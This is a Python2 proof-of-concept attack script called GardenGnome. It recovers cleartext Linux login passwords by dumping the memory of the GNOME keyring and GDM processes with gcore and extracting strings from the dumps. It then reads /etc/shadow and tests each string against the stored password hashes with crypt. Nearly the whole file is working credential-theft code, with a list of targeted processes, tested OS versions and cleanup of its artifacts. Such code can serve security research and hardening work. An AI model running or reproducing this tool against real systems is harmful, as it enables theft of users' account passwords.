#!/usr/bin/python2
#
###################################################################################
#********************************************************************************
#  ____   ____  ____   ___      ___  ____    ____  ____    ___   ___ ___    ___
# /    | /    ||    \ |   \    /  _]|    \  /    ||    \  /   \ |   |   |  /  _]
#|   __||  o  ||  D  )|    \  /  [_ |  _  ||   __||  _  ||     || _   _ | /  [_
#|  |  ||     ||    / |  D  ||    _]|  |  ||  |  ||  |  ||  O  ||  \_/  ||    _]
#|  |_ ||  _  ||    \ |     ||   [_ |  |  ||  |_ ||  |  ||     ||   |   ||   [_
#|     ||  |  ||  .  \|     ||     ||  |  ||     ||  |  ||     ||   |   ||     |
#|___,_||__|__||__|\_||_____||_____||__|__||___,_||__|__| \___/ |___|___||_____|
#
# GardenGnome | GNOME Multiple Process Cleartext Password Disclosure
# Codename    | PoC
# Author      | Kory Findley - k0fin
#********************************************************************************
#
# About:
#    - GardenGnome is a Python2 script to dump a user's cleartext password
#      from various Linux process memory.
#
# Details:
#    - For successful cleartext password disclosure with GardenGnome, an attacker
#      must have the privilege context of a root user or a regular user with
#      the ability to execute Python2 using sudo. Further details can be found
#      within the README.md file included in the gardengnome working directory.
#
# Vulnerable Processes:
#-----------------------------------------------------------------------------------
#            Linux Binary Name           |              Process Name
#-----------------------------------------------------------------------------------
# - Gnome Keyring Daemon                 | (/usr/bin/gnome-keyring-daemon)
# - Gnome Display Manager 3              | (/usr/sbin/gdm3)
# - Gnome Display Manager Session Worker | (gdm-session-worker [pam/gdm-password])
#-----------------------------------------------------------------------------------
#
# Tested Linux OSs / Flavors:
#-----------------------------------------------------------------------------------
#           OS Release Name              |            OS Kernel Release
#-----------------------------------------------------------------------------------
# - Kali GNU/Linux 2016.2 (Rolling)      |         - 4.8.0-kali1-amd64
# - Kali GNU/Linux 2016.1 (Rolling)      |         - 4.6.0-kali1-amd64
# - Ubuntu 16.04.1 LTS (Xenial Xerus)    |         - 4.4.0-31-generic
# - CentOS Linux 7 (Core)                |         - 3.10.0-327.el7.x86_64
#-----------------------------------------------------------------------------------
####################################################################################

import sys
import os
import hashlib
import subprocess
import crypt
import glob
import platform
import psutil

from argparse import ArgumentParser

def gardengnome_banner():

    '''clears the screen and prints
       the GardenGnome ASCII banner'''
    os.system('clear')
    print '''
********************************************************************************
  ____   ____  ____   ___      ___  ____    ____  ____    ___   ___ ___    ___
 /    | /    ||    \ |   \    /  _]|    \  /    ||    \  /   \ |   |   |  /  _]
|   __||  o  ||  D  )|    \  /  [_ |  _  ||   __||  _  ||     || _   _ | /  [_
|  |  ||     ||    / |  D  ||    _]|  |  ||  |  ||  |  ||  O  ||  \_/  ||    _]
|  |_ ||  _  ||    \ |     ||   [_ |  |  ||  |_ ||  |  ||     ||   |   ||   [_
|     ||  |  ||  .  \|     ||     ||  |  ||     ||  |  ||     ||   |   ||     |
|___,_||__|__||__|\_||_____||_____||__|__||___,_||__|__| \___/ |___|___||_____|

GardenGnome | GNOME Multiple Process Cleartext Password Disclosure
Codename    | PoC
Author      | Kory Findley | k0fin
********************************************************************************
    '''

def gardengnome_header():
    '''Prints the header for recovered passwords'''

    header = '| {0:10} | {1:20} | {2:40} | {3:5} |'.format('Username','Password','Process Name','PID')
    print ''
    print '=' * len(header)
    print header
    print '=' * len(header)

def gardengnome_footer():
    '''Prints a simple footer/border line after the attack is complete'''
    header = '| {0:10} | {1:20} | {2:40} | {3:5} |'.format('Username','Password','Process Name','PID')
    footer = '=' * len(header)
    print footer

def get_target_host():
    '''Returns tuple of OS flavor data
       for local host'''
    hostdata = platform.dist()
    return hostdata

def parse_target_host(flavor):
    '''Determines default display manager targets
       based on target machine.'''

    osname = flavor[0]
    print '[<>] Detected {} as target Linux distro'.format(osname)

def get_process_pid(pname):
    '''Takes string of process name and returns PID
       for that process'''
    return subprocess.check_output(['pidof',pname]).strip().split()

def get_procname(pid,keys):
    '''Takes PID of process and JSON values
       for binary name and PID and determines
       process name'''
    for k in keys:
        if pid in keys[k]:
            return k
        else:
            pass

def check_proc_exists(name):
    '''Checks if a process exists by name'''
    all_pids = psutil.pids()
    for pid in all_pids:
        procbin = psutil.Process(pid=pid).cmdline()
        procname = psutil.Process(pid=pid).name()
        if ''.join(procbin) == name or procname == name:
            return True

        else:
            pass

    return False

def get_proclist():
    '''Returns a list of current running process working paths.'''
    return glob.glob('/proc/*')

def get_vuln_proc_names():
    '''Returns a list of processes vulnerable to GardenGnome.'''
    return sorted(['gnome-keyring-daemon','/usr/sbin/gdm3','gdm-session-worker [pam/gdm-password]'])

def get_proc_gcore_file(dmpid):
    '''Runs gcore against the target process to dump its
       memory to a file'''
    os.system('gcore -o ./core {} > /dev/null 2>&1'.format(dmpid))
    return

def get_gcore_buf(dmpid):
    '''Returns buffer full of strings taken from the target process
       core file to use as a wordlist'''
    stringbuf = subprocess.Popen('strings ./core.{}'.format(dmpid), shell=True, stdout=subprocess.PIPE)
    return stringbuf

def get_shadow_accounts():
    '''Get string buffer of user account /etc/shadow contents'''
    with open('/etc/shadow', 'r') as shadowfile:
        accountlist = shadowfile.read().strip().split('\n')
    return accountlist

def attack_user_account(u_acct,corestrings,pname,dmpid):
    '''Performs dictionary attack against target user account'''
    if '$' in u_acct:
        username = u_acct.split('$')[0].split(':')[0].strip()
        useralg = u_acct.split('$')[1]
        usersalt = u_acct.split('$')[2]
        userhash = u_acct.split('$')[3].rsplit(':')[0]
        buildhash = '${}${}${}'.format(useralg,usersalt,userhash)

        for string in corestrings:
            convertstring = crypt.crypt(string, '${}$%s$'.format(useralg) % usersalt)
            if convertstring == buildhash:
                credential_str = '{}:{} ({}:{})'.format(username,string,pname,dmpid)
                return credential_str

            else:
                continue

        return None

def proc_menu(pk):
    '''Prints out a formatted box with the vulnerable proc names'''
    print '{0:60}'.format('=' * 63)
    print '| {0:60}|'.format('Target Processes')
    print '{0:60}'.format('=' * 63)
    for k in pk:
        print '| {0:60}|'.format(k)
    print '{0:60}'.format('=' * 63)

def build_pidlist():
    '''Builds a list of PIDs based on whether or not they are
       potentially vulnerable.'''
    pidlist = []
    pidkeys = {}

    proclist = get_proclist()
    names = get_vuln_proc_names()
    for name in names:
        check_proc = check_proc_exists(name)
        if check_proc:
            pids = get_process_pid(name)
            pidlist = pidlist + pids
            pidkeys.update({name:pids})

#    proc_menu(pidkeys)
#    gardengnome_header()

    for dmpid in pidlist:
        procuser = psutil.Process(pid=int(dmpid)).username()
        procname = get_procname(dmpid, pidkeys)
        proc_mem_dump = get_proc_gcore_file(dmpid)
        stringbuf = get_gcore_buf(dmpid)
        corestrings = stringbuf.stdout.read().split('\n')
        accountlist = get_shadow_accounts()
        for account in accountlist:
            bruteforcer = attack_user_account(account,corestrings,procname,dmpid)
            if bruteforcer != None:
                print bruteforcer

            else:
                pass

#    gardengnome_footer()
    print ''

def clean_garden():
    '''Delete artifacts left over from GardenGnome'''
    coreindex = glob.glob('core.*')
    if len(coreindex) > 0:
        os.system('rm ./core.*')
    else:
        return

def main():
    '''main function for GardenGnome'''
    parser = ArgumentParser()

    parser.add_argument('-a', '--attack', default=False, action='store_true', help='launch GardenGnome attack')
    parser.add_argument('-q', '--quiet', default=False, action='store_true', help='decrease verbosity / suppress banner')
    parser.add_argument('-v', '--verbose', default=False, action='store_true', help='increase verbosity')

    args = parser.parse_args()

    attack = args.attack
    quiet = args.quiet
    verbose = args.verbose

    if attack:

        if not quiet:
            gardengnome_banner()
            print '[<>] Starting GardenGnome...\n'
            build_pidlist()

        else:
            os.system('clear')
            build_pidlist()

    clean_garden()

if __name__ == '__main__':
    main()
